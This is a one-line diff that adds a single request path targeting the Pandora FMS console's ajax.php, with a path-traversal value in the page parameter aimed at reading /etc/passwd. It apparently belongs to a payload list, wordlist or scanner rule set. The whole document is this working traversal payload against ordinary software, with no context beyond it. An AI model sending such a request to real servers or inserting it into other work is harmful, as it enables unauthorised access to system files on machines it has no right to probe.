@@ -1,0 +1,1 @@
+/pandora_console/ajax.php?page=../../../../../../etc/passwd
